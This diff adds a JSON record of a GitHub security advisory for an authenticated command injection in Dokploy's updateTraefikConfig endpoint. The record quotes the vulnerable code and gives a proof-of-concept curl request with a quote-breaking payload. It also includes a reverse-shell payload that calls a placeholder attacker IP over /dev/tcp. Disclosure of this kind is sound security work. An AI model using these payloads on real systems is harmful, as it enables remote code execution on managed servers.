@@ -1,0 +1,50 @@
+{
+  "global": null,
+  "id": "GHSA-p787-6gqg-cvp5",
+  "repo": {
+    "cve_id": "CVE-2026-45630",
+    "cvss_severities": {
+      "cvss_v3": {
+        "score": null,
+        "vector_string": null
+      },
+      "cvss_v4": {
+        "score": null,
+        "vector_string": null
+      }
+    },
+    "cwe_ids": [
+      "CWE-78"
+    ],
+    "description": "### Summary\r\n\r\nAuthenticated OS command injection in the `application.updateTraefikConfig` tRPC endpoint allows admin/owner users to execute arbitrary system commands on remote servers via unsanitized `echo` shell interpolation.\r\n\r\n### Details\r\n**Affected files**:\r\n\r\n- `apps/dokploy/server/api/routers/application.ts` (lines 851-873) - tRPC route accepting `traefikConfig` as a plain `z.string()` with no regex or character restrictions\r\n- `packages/server/src/utils/traefik/application.ts` (lines 213-222) - `writeConfigRemote()` which interpolates the value into a shell `echo` command wrapped in single quotes\r\n\r\nThe tRPC route only validates the input as a string:\r\n\r\n```typescript\r\nupdateTraefikConfig: protectedProcedure\r\n    .input(z.object({\r\n        applicationId: z.string(),\r\n        traefikConfig: z.string()   // no .regex(), no sanitization\r\n    }))\r\n```\r\n\r\nThis value flows to `writeConfigRemote()`, which wraps it in single quotes and executes via SSH:\r\n\r\n```typescript\r\nexport const writeConfigRemote = async (serverId, appName, traefikConfig) => {\r\n    const { DYNAMIC_TRAEFIK_PATH } = paths(true);\r\n    const configPath = path.join(DYNAMIC_TRAEFIK_PATH, `${appName}.yml`);\r\n    await execAsyncRemote(serverId,\r\n        `echo '${traefikConfig}' > ${configPath}`\r\n    );\r\n};\r\n```\r\n\r\nBy including a single quote (`'`) in the `traefikConfig` value, an attacker can break out of the quoting context and inject arbitrary shell commands. This is the same class of vulnerability as previously reported in GitHub Issue #481, which affected the registry password flow but was not addressed in the Traefik configuration path.\r\n\r\n\r\n### PoC\r\n**Prerequisites**:\r\n\r\n1. An admin or owner account on the target Dokploy instance\r\n2. An application deployed on a server with an SSH key configured\r\n\r\n**Steps to reproduce**:\r\n\r\nSend the following tRPC mutation with a crafted `traefikConfig` containing a single quote to break out of the shell quoting:\r\n\r\n```bash\r\ncurl -X POST 'https://<dokploy_host>/api/trpc/application.updateTraefikConfig' \\\r\n  -H 'Cookie: <session_cookie>' \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\r\n    \"applicationId\": \"<target_application_id>\",\r\n    \"traefikConfig\": \"'\"'\"'; id; echo '\"'\"' \"\r\n  }'\r\n```\r\n\r\nOr as a JSON payload:\r\n\r\n```json\r\n{\r\n    \"applicationId\": \"<target_application_id>\",\r\n    \"traefikConfig\": \"'; id; echo '\"\r\n}\r\n```\r\n\r\n**How the shell interprets the command**:\r\n\r\n```bash\r\necho ''                                                        # empty output\r\nid                                                             # injected command executes\r\necho '' > /etc/dokploy/traefik/dynamic/<appName>.yml           # continues normally\r\n```\r\n\r\n**Example - reverse shell**:\r\n\r\n```json\r\n{\r\n    \"applicationId\": \"<target_application_id>\",\r\n    \"traefikConfig\": \"'; bash -c 'exec bash -i &>/dev/tcp/<attacker_ip>/4444 0>&1'; echo '\"\r\n}\r\n```\r\n\r\n### Impact\r\n- **Type**: OS Command Injection (CWE-78)\r\n- **Severity**: High (CVSS 8.8)\r\n- **Vector**: `CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:L`\r\n- **Authentication**: Required, with admin or owner role (or member with legacy `traefikFiles:write` override)\r\n- **Consequence**: Remote code execution with the privileges of the SSH user on managed servers\r\n\r\n---\r\n",
+    "ghsa_id": "GHSA-p787-6gqg-cvp5",
+    "html_url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-p787-6gqg-cvp5",
+    "identifiers": [
+      {
+        "type": "GHSA",
+        "value": "GHSA-p787-6gqg-cvp5"
+      },
+      {
+        "type": "CVE",
+        "value": "CVE-2026-45630"
+      }
+    ],
+    "published_at": "2026-05-11T18:37:57Z",
+    "references": [],
+    "severity": "high",
+    "summary": "Authenticated Remote Code Execution via Command Injection in updateTraefikConfig Echo Statement",
+    "updated_at": "2026-05-13T04:33:45Z",
+    "vulnerabilities": [
+      {
+        "package": {
+          "ecosystem": "npm",
+          "name": "dokploy"
+        },
+        "patched_versions": "",
+        "vulnerable_version_range": "≤ v0.28.8"
+      }
+    ],
+    "withdrawn_at": null
+  },
+  "repository": "Dokploy/dokploy"
+}
